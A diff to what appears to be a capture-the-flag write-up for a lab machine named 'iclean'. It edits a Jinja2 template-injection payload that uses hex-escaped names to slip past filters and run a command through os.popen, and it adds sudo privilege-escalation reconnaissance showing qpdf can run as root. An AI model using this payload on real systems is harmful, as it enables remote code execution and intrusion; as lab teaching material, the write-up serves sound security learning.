@@ -263,7 +263,7 @@ We're being able to see our output reflected, so the first vulnerability that co
 
 We did it! The result of the operation is reflected in the output, so let's try to execute a command in the victim machine with one of the most typical jinja2 payloads to bypass the most common filters:
 
-Payload -> {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+Payload -> "{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}"
 
 <br />
 
@@ -449,4 +449,21 @@ eba486700e25313333bb89fe31xxxxxx
 
 <br />
 
+Once we became consuela, proceed to list her sudoer privileges and list this:
+
+<br />
+
+```bash
+consuela@iclean:~$ sudo -l
+[sudo] password for consuela: 
+Matching Defaults entries for consuela on iclean:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User consuela may run the following commands on iclean:
+    (ALL) /usr/bin/qpdf
+```
+
+<br />
+
+We can run the binary qpdf as root
 
